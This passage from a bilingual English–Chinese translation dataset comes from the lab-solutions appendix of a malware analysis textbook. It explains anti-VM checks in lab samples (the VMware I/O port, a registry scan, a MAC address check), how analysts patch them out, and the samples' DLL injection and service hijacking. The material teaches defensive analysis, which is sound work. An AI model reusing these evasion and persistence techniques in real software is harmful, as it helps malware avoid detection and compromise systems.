  type: TYPE_NORMAL
  zh: 100061FA 将 al 设置为 [ebp+var_1C]
- en: '*Listing 17-7L: Querying the I/O communication port*'
  id: totrans-5909
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-7L：查询 I/O 通信端口*'
- en: The malware is querying the I/O communication port (0x5668) using the in instruction
    at . (VMware uses the virtual I/O port for communication between the VM and the
    host OS.) This VMware port is loaded into EDX at
  id: totrans-5910
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件正在使用  处的 in 指令查询 I/O 通信端口（0x5668）。(VMware 使用虚拟 I/O 端口在虚拟机与宿主操作系统之间进行通信。)这个
    VMware 端口在 EDX 中加载。
- en: , and the action performed is loaded into ECX in the previous instruction.
  id: totrans-5911
  prefs: []
  type: TYPE_NORMAL
  zh: ，并且在前一个指令中执行的操作被加载到 ECX 中。
- en: In this case, the action is 0xA, which means “get VMware version type.” EAX
  id: totrans-5912
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，操作是 0xA，表示“获取 VMware 版本类型。” EAX
- en: is loaded with the magic number 0x564d5868 (VMXh) at , and the malware checks
    that the magic number is echoed back immediately after the in instruction with
    the cmp at . The result of the comparison is moved into var_1C, and is ultimately
    moved into AL as sub_10006196’s return value.
  id: totrans-5913
  prefs: []
  type: TYPE_NORMAL
  zh: 装载了魔法数字 0x564d5868 (VMXh) 在 ，并且恶意软件检查在 in 指令后立即回显的魔法数字 cmp 在 。比较的结果被移动到 var_1C，并最终作为
    sub_10006196 的返回值移动到 AL。
- en: This malware doesn’t appear to care about the VMware version. It just wants
    to see if the I/O communication port echoes back with the magic value. At runtime,
    we can bypass the backdoor I/O communication port technique by replacing the in
    instruction with a NOP. Inserting the NOP
  id: totrans-5914
  prefs: []
  type: TYPE_NORMAL
  zh: 此恶意软件似乎不关心 VMware 版本。它只想查看 I/O 通信端口是否以魔法值回显。在运行时，我们可以通过将 in 指令替换为 NOP 来绕过后门
    I/O 通信端口技术。插入 NOP
- en: allows the program to complete installation.
  id: totrans-5915
  prefs: []
  type: TYPE_NORMAL
  zh: 允许程序完成安装。
- en: Before further analyzing the imports dynamically, let’s continue to examine
    the InstallRT export. The code in Listing 17-8L is taken from the start of the
    InstallRT export. The jz instruction at  determines if the anti-1 7
  id: totrans-5916
  prefs: []
  type: TYPE_NORMAL
  zh: 在进一步分析动态导入之前，让我们继续检查 InstallRT 导出。列表 17-8L 中的代码取自 InstallRT 导出的开始。 处的 jz 指令确定是否执行
    anti-1 7
- en: VM check will be performed.
  id: totrans-5917
  prefs: []
  type: TYPE_NORMAL
  zh: 将执行 VM 检查。
- en: 1000D847 mov eax, off_10019034 ; **[This is DVM]5**
  id: totrans-5918
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D847 将 eax 设置为 off_10019034 ; **[这是 DVM]5**
- en: 1000D84C push esi
  id: totrans-5919
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D84C 推送 esi
- en: 1000D84D mov esi, ds:atoi
  id: totrans-5920
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D84D 将 esi 设置为 ds:atoi
- en: 1000D853 add eax, 0Dh 
  id: totrans-5921
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D853 添加 eax, 0Dh 
- en: 1000D856 push eax ; Str
  id: totrans-5922
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D856 推送 eax ; Str
- en: 1000D857 call esi ; **atoi**
  id: totrans-5923
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D857 调用 esi ; **atoi**
- en: 1000D859 test eax, eax 
  id: totrans-5924
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D859 测试 eax, eax 
- en: 1000D85B pop ecx
  id: totrans-5925
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D85B 弹出 ecx
- en: 1000D85C jz short loc_1000D88E 
  id: totrans-5926
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D85C jz short loc_1000D88E 
- en: '*Listing 17-8L: Checking the DVM static configuration option* Solutions to
    Labs'
  id: totrans-5927
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-8L：检查 DVM 静态配置选项* 实验室解决方案'
- en: '**675**'
  id: totrans-5928
  prefs: []
  type: TYPE_NORMAL
  zh: '**675**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5929
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The code uses atoi (shown in bold) to turn a string into a number. The number
    is parsed out of the string [This is DVM]5 (also shown in bold). The reference
    to [This is DVM]5 is loaded into EAX, and EAX is advanced by 0xD
  id: totrans-5930
  prefs: []
  type: TYPE_NORMAL
  zh: 代码使用 **atoi**（以粗体显示）将字符串转换为数字。数字从字符串 [这是 DVM]5（也以粗体显示）中解析出来。对 [这是 DVM]5 的引用被加载到
    EAX，并且 EAX 通过 0xD
- en: at , which moves the string pointer to the 5 character, which is turned into
    the number 5 with the call to atoi. The test at  checks to see if the number
    parsed is 0\.
  id: totrans-5931
  prefs: []
  type: TYPE_NORMAL
  zh: 在  处，将字符串指针移动到 5 个字符，通过调用 atoi 将其转换为数字 5。 处的测试检查解析的数字是否为 0。
- en: '**NOTE**'
  id: totrans-5932
  prefs: []
  type: TYPE_NORMAL
  zh: '**注意**'
- en: '*DVM is a static configuration option. If we open the malware in a hex editor,
    we can* *manually change the string to read [This is DVM]0, and the malware will
    no longer* *perform the anti-VM check.*'
  id: totrans-5933
  prefs: []
  type: TYPE_NORMAL
  zh: '*DVM 是一个静态配置选项。如果我们用十六进制编辑器打开恶意软件，我们可以* *手动将字符串更改为 [这是 DVM]0，恶意软件将不再* *执行抗
    VM 检查。*'
- en: The following excerpt shows a subset of the static configuration options in
    *Lab17-02.exe*, with a domain name and port 80 shown in bold. The LOG
  id: totrans-5934
  prefs: []
  type: TYPE_NORMAL
  zh: 以下摘录显示了 *Lab17-02.exe* 中的静态配置选项子集，域名和端口 80 以粗体显示。LOG
- en: option (also shown in bold) is probably used by the malware to determine if
    *xinstall.log* should be created and used.
  id: totrans-5935
  prefs: []
  type: TYPE_NORMAL
  zh: 选项（也以粗体显示）可能是恶意软件用来确定是否创建并使用 *xinstall.log* 的。
- en: '[This is RNA]newsnews'
  id: totrans-5936
  prefs: []
  type: TYPE_NORMAL
  zh: '[这是 RNA]newsnews'
- en: '[This is RDO]**newsnews.practicalmalwareanalysis.com**'
  id: totrans-5937
  prefs: []
  type: TYPE_NORMAL
  zh: '[这是 RDO]**newsnews.practicalmalwareanalysis.com**'
- en: '[This is RPO]**80**'
  id: totrans-5938
  prefs: []
  type: TYPE_NORMAL
  zh: '[这是 RPO]**80**'
- en: '[This is DVM]5'
  id: totrans-5939
  prefs: []
  type: TYPE_NORMAL
  zh: '[这是 DVM]5'
- en: '[This is SSD]'
  id: totrans-5940
  prefs: []
  type: TYPE_NORMAL
  zh: '[这是 SSD]'
- en: '[This is **LOG**]1'
  id: totrans-5941
  prefs: []
  type: TYPE_NORMAL
  zh: '[这是 **LOG**]1'
- en: We’ll complete our analysis of InstallRT by analyzing the method sub_1000D3D0\.
    This method is long, but all of its imported functions and logging strings make
    the analysis process much easier.
  id: totrans-5942
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将通过分析方法 sub_1000D3D0 来完成对 InstallRT 的分析。此方法很长，但所有导入的函数和日志字符串使分析过程变得容易得多。
- en: The sub_1000D3D0 method begins by copying the malware into the Windows system
    directory. As shown in Listing 17-9L, InstallRT takes an optional argument. The
    strlen at  checks the string length of the argument. If the string length is
    0 (meaning no argument), iexplore.exe is used (shown in bold).
  id: totrans-5943
  prefs: []
  type: TYPE_NORMAL
  zh: sub_1000D3D0 方法首先将恶意软件复制到 Windows 系统目录。如列表 17-9L 所示，InstallRT 采取一个可选参数。strlen
    在  处检查参数的字符串长度。如果字符串长度为 0（表示没有参数），则使用 iexplore.exe（以粗体显示）。
- en: 1000D50E push [ebp+process_name] ; Str
  id: totrans-5944
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D50E 推送 [ebp+process_name] ; Str
- en: 1000D511 call strlen 
  id: totrans-5945
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D511 调用 strlen 
- en: 1000D516 test eax, eax
  id: totrans-5946
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D516 测试 eax, eax
- en: 1000D518 pop ecx
  id: totrans-5947
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D518 弹出 ecx
- en: 1000D519 jnz short loc_1000D522
  id: totrans-5948
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D519 jnz short loc_1000D522
- en: 1000D51B push offset **aIexplore_exe ; "iexplore.exe"**
  id: totrans-5949
  prefs: []
  type: TYPE_NORMAL
  zh: 1000D51B 推送偏移量 **aIexplore_exe ; "iexplore.exe"**
- en: '*Listing 17-9L: Argument used as the target process name with iexplore.exe
    as the default* The export argument (or iexplore.exe) is used as a target process
    for DLL injection of this malware. At 0x1000D53A, the malware calls a function
    to find the target process in the process listing. If the process is found, the
    malware uses the process’s PID in the call to sub_1000D10D, which uses a common
    process injection trio of calls: VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.
    We conclude that InstallRT performs DLL injection to launch the malware, which
    we confirm by running the malware (after patching the static DVM option) and using
    Process Explorer to see the DLL load into another process.'
  id: totrans-5950
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-9L：用作目标进程名称的参数，默认为 iexplore.exe* 该导出参数（或 iexplore.exe）被用作此恶意软件的 DLL
    注入的目标进程。在 0x1000D53A 处，恶意软件调用一个函数在进程列表中查找目标进程。如果找到进程，恶意软件将使用进程的 PID 在对 sub_1000D10D
    的调用中使用一个常见的进程注入三联调用：VirtualAllocEx、WriteProcessMemory 和 CreateRemoteThread。我们得出结论，InstallRT
    通过 DLL 注入来启动恶意软件，我们通过运行恶意软件（在修补静态 DVM 选项后）并使用 Process Explorer 来查看 DLL 被加载到另一个进程来确认这一点。'
- en: '**676**'
  id: totrans-5951
  prefs: []
  type: TYPE_NORMAL
  zh: '**676**'
- en: Appendix C
  id: totrans-5952
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5953
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 153](index-710_1.png)'
  id: totrans-5954
  prefs: []
  type: TYPE_IMG
  zh: '![Image 153](index-710_1.png)'
- en: Next, we focus on the InstallSA export, which has the same high-level structure
    as InstallRT. Both exports check the DVM static configuration option before performing
    the anti-VM checks. The only difference between the two is that InstallSA calls
    sub_1000D920 for its main functionality.
  id: totrans-5955
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们关注 InstallSA 导出，它与 InstallRT 具有相同的高级结构。这两个导出在执行反虚拟机检查之前都会检查 DVM 静态配置选项。两者之间的唯一区别是
    InstallSA 调用 sub_1000D920 以实现其主要功能。
- en: Examining sub_1000D920, we see that it takes an optional argument (by default
    Irmon). This function creates a service at 0x1000DBC4 if you specify a service
    name in the Svchost Netsvcs group, or it creates the Irmon service if you don’t
    specify a service name. The service is set with a blank description and a display
    name of *X* System Services, where *X* is the service name. After creating the
    service, InstallSA sets the *ServiceDLL* path to this malware in the Windows system
    directory. We confirm this by performing dynamic analysis and using *rundll32.exe*
    to call the InstallSA function. We use Regedit to look at the Irmon service in
    the registry and see the change shown in Figure 17-2L.
  id: totrans-5956
  prefs: []
  type: TYPE_NORMAL
  zh: 检查 sub_1000D920，我们看到它接受一个可选参数（默认为 Irmon）。此函数在指定 Svchost Netsvcs 组中的服务名称时在 0x1000DBC4
    处创建一个服务，或者如果不指定服务名称则创建 Irmon 服务。该服务设置为空白描述和显示名称为 *X* 系统服务，其中 *X* 是服务名称。创建服务后，InstallSA
    将 *ServiceDLL* 路径设置为 Windows 系统目录中的此恶意软件。我们通过执行动态分析和使用 *rundll32.exe* 来调用 InstallSA
    函数来确认这一点。我们使用 Regedit 来查看注册表中的 Irmon 服务，并看到图 17-2L 中所示的变化。
- en: '*Figure 17-2L: Registry overwrite of the* ServiceDLL *for Irmon* Because the
    InstallSA method doesn’t copy the malware to the Windows system directory, this
    installation method fails to install the malware.'
  id: totrans-5957
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 17-2L：Irmon 的 ServiceDLL 注册表覆盖* 由于 InstallSA 方法没有将恶意软件复制到 Windows 系统目录，因此这种安装方法无法安装恶意软件。'
- en: Finally, we focus on the InstallSB export, which has the same high-level structure
    as InstallSA and InstallRT. All three exports check the DVM static configuration
    option before performing the anti-VM check. InstallSB calls sub_1000DF22 for its
    main functionality and contains an extra call to sub_10005A0A.
  id: totrans-5958
  prefs: []
  type: TYPE_NORMAL
  zh: 最后，我们关注 InstallSB 导出，它与 InstallSA 和 InstallRT 具有相同的高级结构。这三个导出在执行反虚拟机检查之前都会检查
    DVM 静态配置选项。InstallSB 调用 sub_1000DF22 以实现其主要功能，并包含一个额外的对 sub_10005A0A 的调用。
- en: The function sub_10005A0A disables Windows File Protection using the method
    discussed in Lab 12-4\.
  id: totrans-5959
  prefs: []
  type: TYPE_NORMAL
  zh: 函数 sub_10005A0A 使用在实验室 12-4 中讨论的方法禁用 Windows 文件保护。
- en: The sub_1000DF22 function appears to contain functionality from both InstallSA
    and InstallRT. InstallSB also takes an optional argument containing a service
    name (by default NtmsSvc) that the malware uses to overwrite a service on the
    local system. In the default case, the malware stops the NtmsSvc service if it
    is running and overwrites *ntmssvc.dll* in the Windows system directory with itself.
    The malware then attempts to start the service again. If the malware cannot start
    the service, the malware performs DLL injection, as seen with the call at 0x1000E571\.
    (This is similar to how InstallRT works, except InstallSB injects into *svchost.exe*.)
    InstallSB also saves the old service **1 7**
  id: totrans-5960
  prefs: []
  type: TYPE_NORMAL
  zh: sub_1000DF22函数似乎包含了InstallSA和InstallRT的功能。InstallSB还接受一个可选参数，包含一个服务名称（默认为NtmsSvc），恶意软件使用它来覆盖本地系统上的服务。在默认情况下，如果NtmsSvc服务正在运行，恶意软件会停止该服务并用自身的*ntmssvc.dll*覆盖Windows系统目录中的*ntmssvc.dll*。然后恶意软件尝试再次启动服务。如果恶意软件无法启动服务，它将执行DLL注入，就像在0x1000E571处的调用所看到的那样。（这与InstallRT的工作方式类似，但InstallSB注入到*svchost.exe*。）InstallSB还保存了旧服务的**1
    7**
- en: binary, so that UninstallSB can restore it if necessary.
  id: totrans-5961
  prefs: []
  type: TYPE_NORMAL
  zh: 二进制格式，以便UninstallSB在必要时可以恢复它。
- en: We’ll leave the full analysis of this malware to you, since our focus here is
    on anti-VM techniques. This malware is an extensive backdoor with considerable
    functionality, including keylogging, capturing audio and video, transferring files,
    acting as a proxy, retrieving system information, using a reverse command shell,
    injecting DLLs, and downloading and launching commands.
  id: totrans-5962
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将把对这种恶意软件的完整分析留给你，因为我们的重点是反虚拟机技术。这种恶意软件是一个功能丰富的后门，包括键盘记录、捕获音频和视频、传输文件、充当代理、检索系统信息、使用反向命令shell、注入DLL以及下载和执行命令。
- en: To fully analyze this malware, analyze its export functions and static configuration
    options before focusing on the backdoor network communication capability. See
    if you can write a script to decode network traffic generated by this malware.
  id: totrans-5963
  prefs: []
  type: TYPE_NORMAL
  zh: 要完全分析这种恶意软件，在专注于后门网络通信能力之前，分析其导出函数和静态配置选项。看看您是否能编写一个脚本来解码由这种恶意软件生成的网络流量。
- en: Solutions to Labs
  id: totrans-5964
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解答
- en: '**677**'
  id: totrans-5965
  prefs: []
  type: TYPE_NORMAL
  zh: '**677**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5966
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 17-3 Solutions**'
  id: totrans-5967
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 17-3 解答**'
- en: '***Short Answers***'
  id: totrans-5968
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短答案***'
- en: 1\.
  id: totrans-5969
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: The malware immediately terminates inside a VM, unlike Lab 12-2, which performs
    process replacement on *svchost.exe*.
  id: totrans-5970
  prefs: []
  type: TYPE_NORMAL
  zh: 与Lab 12-2不同，这种恶意软件在虚拟机内部立即终止，而不是在*svchost.exe*上执行进程替换。
- en: 2\.
  id: totrans-5971
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: If you force the jumps at 0x4019A1, 0x4019C0, and 0x401467 to be taken, and
    the jump at 0x401A2F to not be taken, the malware performs process replacement
    using a keylogger from its resource section.
  id: totrans-5972
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您强制0x4019A1、0x4019C0和0x401467处的跳转被执行，而0x401A2F处的跳转不被执行，恶意软件将使用其资源部分中的键盘记录器执行进程替换。
- en: 3\.
  id: totrans-5973
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: 'The malware uses four different anti-VM techniques:'
  id: totrans-5974
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用了四种不同的反虚拟机技术：
- en: 
  id: totrans-5975
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: It uses the backdoor I/O communication port.
  id: totrans-5976
  prefs: []
  type: TYPE_NORMAL
  zh: 它使用后门I/O通信端口。
- en: 
  id: totrans-5977
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: It searches the registry key SYSTEM\CurrentControlSet\Control\ DeviceClasses
    for the string vmware.
  id: totrans-5978
  prefs: []
  type: TYPE_NORMAL
  zh: 它在注册表键SYSTEM\CurrentControlSet\Control\ DeviceClasses中搜索字符串vmware。
- en: 
  id: totrans-5979
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: It checks the MAC address to see if it is the default used by VMware.
  id: totrans-5980
  prefs: []
  type: TYPE_NORMAL
  zh: 它检查MAC地址以查看它是否是VMware使用的默认地址。
- en: 
  id: totrans-5981
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: It searches the process list with a string-hashing function for processes starting
    with the string vmware.
  id: totrans-5982
  prefs: []
  type: TYPE_NORMAL
  zh: 它使用字符串哈希函数搜索以vmware开头的进程列表。
- en: 4\.
  id: totrans-5983
  prefs: []
  type: TYPE_NORMAL
  zh: '4.'
- en: To avoid the anti-VM techniques used by this malware, you can remove VMware
    tools and modify the MAC address.
  id: totrans-5984
  prefs: []
  type: TYPE_NORMAL
  zh: 为了避免这种恶意软件使用的反虚拟机技术，您可以移除VMware工具并修改MAC地址。
- en: 5\.
  id: totrans-5985
  prefs: []
  type: TYPE_NORMAL
  zh: '5.'
- en: 'In OllyDbg, you can apply the following patches:'
  id: totrans-5986
  prefs: []
  type: TYPE_NORMAL
  zh: 在OllyDbg中，您可以应用以下补丁：
- en: 
  id: totrans-5987
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: NOP-out the instruction at 0x40145D.
  id: totrans-5988
  prefs: []
  type: TYPE_NORMAL
  zh: 将0x40145D处的指令NOP掉。
- en: 
  id: totrans-5989
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Change the instructions at 0x40199F and 0x4019BE to xor eax, eax.
  id: totrans-5990
  prefs: []
  type: TYPE_NORMAL
  zh: 将0x40199F和0x4019BE处的指令修改为xor eax, eax。
- en: 
  id: totrans-5991
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Modify the instruction at 0x40169F to jmp 0x40184A.
  id: totrans-5992
  prefs: []
  type: TYPE_NORMAL
  zh: 将0x40169F处的指令修改为jmp 0x40184A。
- en: '***Detailed Analysis***'
  id: totrans-5993
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: As noted in the lab description, this malware is the same as *Lab12-02.exe*
    except that it includes anti-VM techniques. Therefore, a good place to start is
    with a review of Lab 12-2\.
  id: totrans-5994
  prefs: []
  type: TYPE_NORMAL
  zh: 如实验室描述中所述，这种恶意软件与*Lab12-02.exe*相同，除了它包含了反虚拟机技术。因此，一个好的开始是回顾Lab 12-2。
- en: '**Searching for Vulnerable Instructions**'
  id: totrans-5995
  prefs: []
  type: TYPE_NORMAL
  zh: '**搜索易受攻击的指令**'
- en: We begin by loading the binary into IDA Pro and searching for vulnerable x86
    instructions using *findAntiVM.py* (as in Lab 17-1). This script identifies one
    anti-VM instruction at 0x401AC8 and highlights it in red. We notice that this
    is the backdoor I/O communication port being queried via the in instruction. This
    anti-VM technique is contained in the function named sub_401A80 by IDA Pro. This
    function returns 1 if it is executing inside a VM; otherwise, it returns 0\. There
    is only one cross-reference from the beginning of the main function, as shown
    at  in Listing 17-10L.
  id: totrans-5996
  prefs: []
  type: TYPE_NORMAL
  zh: 我们首先将二进制文件加载到 IDA Pro 中，并使用 *findAntiVM.py*（如实验室 17-1 中所示）搜索易受攻击的 x86 指令。此脚本在
    0x401AC8 处识别了一个反虚拟机指令，并用红色突出显示。我们注意到这是通过 in 指令查询的后门 I/O 通信端口。此反虚拟机技术包含在 IDA Pro
    命名的函数 sub_401A80 中。如果该函数在虚拟机内部执行，则返回 1；否则返回 0。从主函数的开始只有一个交叉引用，如图 17-10L 中的  所示。
- en: 0040199A call sub_401A80  ; Query I/O communication port 0040199F test eax,
    eax 
  id: totrans-5997
  prefs: []
  type: TYPE_NORMAL
  zh: 0040199A call sub_401A80  ; 查询 I/O 通信端口 0040199F test eax, eax 
- en: 004019A1 jz short loc_4019AA 
  id: totrans-5998
  prefs: []
  type: TYPE_NORMAL
  zh: 004019A1 jz short loc_4019AA 
- en: 004019A3 xor eax, eax
  id: totrans-5999
  prefs: []
  type: TYPE_NORMAL
  zh: 004019A3 xor eax, eax
- en: 004019A5 jmp loc_401A71
  id: totrans-6000
  prefs: []
  type: TYPE_NORMAL
  zh: 004019A5 jmp loc_401A71
- en: '*Listing 17-10L: The check after the call to query the I/O communication port*
    **678**'
  id: totrans-6001
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 17-10L：调用查询 I/O 通信端口后的检查* **678**'
- en: Appendix C
  id: totrans-6002
  prefs: []
  type: TYPE_NORMAL
  zh: 附录 C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6003
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 154](index-712_1.png)'
  id: totrans-6004
  prefs: []
  type: TYPE_IMG
  zh: '![Image 154](index-712_1.png)'
- en: 'The jz instruction at  must be taken, or the main method will terminate immediately
    by jumping to 0x401A71\. We disable this anti-VM technique by setting the zero
    flag to 1 when execution arrives at the jz instruction. To permanently disable
    this technique, change the test instruction at  into xor eax, eax as follows:'
  id: totrans-6005
  prefs: []
  type: TYPE_NORMAL
  zh: 在  处必须执行 jz 指令，否则主方法将立即通过跳转到 0x401A71 终止。当执行到达 jz 指令时，我们通过将零标志设置为 1 来禁用此反虚拟机技术。要永久禁用此技术，将
     处的测试指令更改为 xor eax, eax，如下所示：
- en: 1\.
  id: totrans-6006
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: Start OllyDbg and place your cursor on line 0x40199F.
  id: totrans-6007
  prefs: []
  type: TYPE_NORMAL
  zh: 启动 OllyDbg 并将光标置于 0x40199F 行。
- en: 2\.
  id: totrans-6008
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: Press the spacebar and enter **xor eax, eax** in the text box.
  id: totrans-6009
  prefs: []
  type: TYPE_NORMAL
  zh: 按下空格键并在文本框中输入 **xor eax, eax**。
- en: 3\.
  id: totrans-6010
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: Click **Assemble**.
  id: totrans-6011
  prefs: []
  type: TYPE_NORMAL
  zh: 点击 **汇编**。
- en: '**Finding Anti-VM Techniques Using Strings**'
  id: totrans-6012
  prefs: []
  type: TYPE_NORMAL
  zh: '**使用字符串查找反虚拟机技术**'
- en: 'Next, we use Strings to compare the output from Lab 12-2 to the output from
    *Lab17-03.exe*. The following are the new strings found in this lab: vmware'
  id: totrans-6013
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们使用 Strings 将实验室 12-2 的输出与 *Lab17-03.exe* 的输出进行比较。以下是此实验室中找到的新字符串：vmware
- en: SYSTEM\CurrentControlSet\Control\DeviceClasses
  id: totrans-6014
  prefs: []
  type: TYPE_NORMAL
  zh: SYSTEM\CurrentControlSet\Control\DeviceClasses
- en: Iphlpapi.dll
  id: totrans-6015
  prefs: []
  type: TYPE_NORMAL
  zh: Iphlpapi.dll
- en: GetAdaptersInfo
  id: totrans-6016
  prefs: []
  type: TYPE_NORMAL
  zh: GetAdaptersInfo
- en: These strings provide us with interesting leads. For example, the string SYSTEM\CurrentControlSet\Control\DeviceClasses
    appears to be a registry path, and GetAdaptersInfo is a function used for getting
    information about the network adapter. Digging deeper into the first string in
    the listing, vmware, with IDA Pro, we find only one cross-reference to this string
    from the subroutine sub_4011C0\.
  id: totrans-6017
  prefs: []
  type: TYPE_NORMAL
  zh: 这些字符串为我们提供了有趣的线索。例如，字符串 SYSTEM\CurrentControlSet\Control\DeviceClasses 看起来是一个注册表路径，而
    GetAdaptersInfo 是一个用于获取网络适配器信息的函数。通过 IDA Pro 深入研究列表中的第一个字符串 vmware，我们发现只有一个从子例程
    sub_4011C0 到此字符串的交叉引用。
- en: Figure 17-3L shows the cross-reference graph for sub_4011C0\. The arrows leaving
    sub_4011C0 show that it calls several registry functions. The function also calls
    itself, as shown by the arrow that loops back (making it a recursive function).
    Based on the graph, we suspect that the function is recursively checking the registry
    for the string vmware. Finally, Figure 17-3L shows that sub_4011C0 is called from
    main.
  id: totrans-6018
  prefs: []
  type: TYPE_NORMAL
  zh: 图 17-3L 显示了 sub_4011C0 的交叉引用图。离开 sub_4011C0 的箭头表明它调用了一些注册表函数。该函数还通过回环的箭头调用自身（使其成为递归函数）。根据图示，我们怀疑该函数正在递归检查注册表中的字符串
    vmware。最后，图 17-3L 显示 sub_4011C0 是从主函数中调用的。
- en: '**1 7**'
  id: totrans-6019
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 7**'
- en: '*Figure 17-3L: Cross-reference graph for sub_4011C0*'
  id: totrans-6020
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 17-3L：sub_4011C0 的交叉引用图*'
- en: Listing 17-11L shows where sub_4011C0 is called at  inside the main function.
    Three parameters are pushed onto the stack before the call, including the registry
    key, which we saw in the strings listing.
  id: totrans-6021
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 17-11L 显示了 sub_4011C0 在主函数内部  处的调用位置。在调用之前，将三个参数压入堆栈，包括我们在字符串列表中看到的注册表键。
- en: Solutions to Labs
  id: totrans-6022
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**679**'
  id: totrans-6023
  prefs: []
  type: TYPE_NORMAL
  zh: '**679**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-6024
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 004019AA push 2 ; int 004019AC push offset SubKey ; "SYSTEM\\CurrentControlSet\\Control\\Device"...
  id: totrans-6025
  prefs: []
  type: TYPE_NORMAL
  zh: 004019AA push 2 ; int 004019AC push offset SubKey ; "SYSTEM\\CurrentControlSet\\Control\\Device"...
- en: 004019B1 push 80000002h ; hKey
  id: totrans-6026
  prefs: []
  type: TYPE_NORMAL
  zh: 004019B1 push 80000002h ; hKey
- en: 004019B6 call sub_4011C0 
  id: totrans-6027
  prefs: []
  type: TYPE_NORMAL
  zh: 004019B6 call sub_4011C0 
- en: 004019BB add esp, 0Ch
  id: totrans-6028
  prefs: []
  type: TYPE_NORMAL
  zh: 004019BB add esp, 0Ch
- en: 004019BE test eax, eax 
  id: totrans-6029
  prefs: []
  type: TYPE_NORMAL
  zh: 004019BE test eax, eax 
- en: 004019C0 jz short loc_4019C9 
  id: totrans-6030
  prefs: []
  type: TYPE_NORMAL
  zh: 004019C0 jz short loc_4019C9 
- en: '*Listing 17-11L: The parameters for sub_4011C0 and the check after* Since SYSTEM\CurrentControlSet\Control\DeviceClasses
    is passed to a recursive registry function, we can assume this function is recursively
    checking the registry from that path on. This is a system residue check, as described
    in Chapter 17\. If you examine sub_4011C0 further, you will see it loop through
    the registry subkeys under DeviceClasses. It compares the first six characters
    (after changing them to lowercase) of each subkey name to the string vmware.'
  id: totrans-6031
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单 17-11L：sub_4011C0 的参数和之后的检查* 由于 SYSTEM\CurrentControlSet\Control\DeviceClasses
    被传递给递归注册表函数，我们可以假设这个函数是从该路径开始递归检查注册表的。这是一个系统残留检查，如第 17 章所述。如果你进一步检查 sub_4011C0，你会看到它遍历
    DeviceClasses 下的注册表子键。它将每个子键名称的前六个字符（在转换为小写后）与字符串 vmware 进行比较。'
- en: Since our goal is to have the malware run in our safe environment, we just need
    to ensure that the jz instruction at  is taken; otherwise, the program will terminate
    immediately. We disable this anti-VM technique by making sure the zero flag is
    1 when we arrive at the jz instruction. We can permanently disable this check
    by changing the test instruction at  into xor eax, eax using OllyDbg, as described
    in “Searching for Vulnerable Instructions” on page 670\.
  id: totrans-6032
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们的目标是让恶意软件在我们的安全环境中运行，我们只需确保在到达 jz 指令时零标志被设置；否则，程序将立即终止。我们通过确保在到达 jz 指令时零标志为
    1 来禁用这种反虚拟机技术。我们可以通过使用 OllyDbg 将  处的 test 指令更改为 xor eax, eax 来永久禁用此检查，正如在第 670
